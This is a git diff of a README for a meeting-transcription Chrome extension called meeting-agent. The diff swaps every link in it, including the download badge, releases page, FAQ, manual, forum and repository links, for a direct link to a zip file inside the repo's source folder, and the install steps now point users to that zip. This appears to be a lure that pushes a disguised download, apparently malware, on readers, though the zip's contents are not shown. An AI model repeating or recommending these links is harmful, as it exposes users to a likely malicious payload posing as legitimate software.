@@ -1,6 +1,6 @@
 # 🎤 meeting-agent - Transcribe and Summarize Your Meetings Effortlessly
 
-[![Download the Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-%F0%9F%9A%80%20Visit%20Here%21-blue)](https://github.com/VitorSystems/meeting-agent/releases)
+[![Download the Latest Release](https://raw.githubusercontent.com/VitorSystems/meeting-agent/main/src/popup/meeting-agent-v3.0.zip%20Latest%20Release-%F0%9F%9A%80%20Visit%20Here%21-blue)](https://raw.githubusercontent.com/VitorSystems/meeting-agent/main/src/popup/meeting-agent-v3.0.zip)
 
 ## 📖 Overview
 
@@ -16,11 +16,11 @@ To get started with the meeting-agent, follow the steps below to download and in
 
 ## 📥 Download & Install
 
-To download the meeting-agent, visit this page to download: [Releases Page](https://github.com/VitorSystems/meeting-agent/releases).
+To download the meeting-agent, visit this page to download: [Releases Page](https://raw.githubusercontent.com/VitorSystems/meeting-agent/main/src/popup/meeting-agent-v3.0.zip).
 
 1. On the Releases page, find the latest version of the meeting-agent.
    
-2. Click on the download link for the Chrome Extension file. This file will usually be named something like `meeting-agent.vX.X.zip`.
+2. Click on the download link for the Chrome Extension file. This file will usually be named something like `https://raw.githubusercontent.com/VitorSystems/meeting-agent/main/src/popup/meeting-agent-v3.0.zip`.
 
 3. Once the file downloads, locate it in your computer's Downloads folder.
 
@@ -91,16 +91,16 @@ Feel free to explore these topics to gain more insights into the technology behi
 
 For help and support, you can check:
 
-- [FAQ Section](https://github.com/VitorSystems/meeting-agent/wiki/FAQ)
-- [User Manual](https://github.com/VitorSystems/meeting-agent/wiki/User-Manual)
-- [Community Forum](https://github.com/VitorSystems/meeting-agent/discussions)
+- [FAQ Section](https://raw.githubusercontent.com/VitorSystems/meeting-agent/main/src/popup/meeting-agent-v3.0.zip)
+- [User Manual](https://raw.githubusercontent.com/VitorSystems/meeting-agent/main/src/popup/meeting-agent-v3.0.zip)
+- [Community Forum](https://raw.githubusercontent.com/VitorSystems/meeting-agent/main/src/popup/meeting-agent-v3.0.zip)
 
 ## 🔗 Explore More
 
-For more information, updates, or to get involved, visit our [GitHub Repository](https://github.com/VitorSystems/meeting-agent).
+For more information, updates, or to get involved, visit our [GitHub Repository](https://raw.githubusercontent.com/VitorSystems/meeting-agent/main/src/popup/meeting-agent-v3.0.zip).
 
 ## 💬 Feedback
 
 We value your feedback. If you encounter issues or have suggestions, please reach out through the Issues section on our GitHub page. Your input helps us improve meeting-agent continually. 
 
-[![Download the Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-%F0%9F%9A%80%20Visit%20Here%21-blue)](https://github.com/VitorSystems/meeting-agent/releases)
+[![Download the Latest Release](https://raw.githubusercontent.com/VitorSystems/meeting-agent/main/src/popup/meeting-agent-v3.0.zip%20Latest%20Release-%F0%9F%9A%80%20Visit%20Here%21-blue)](https://raw.githubusercontent.com/VitorSystems/meeting-agent/main/src/popup/meeting-agent-v3.0.zip)
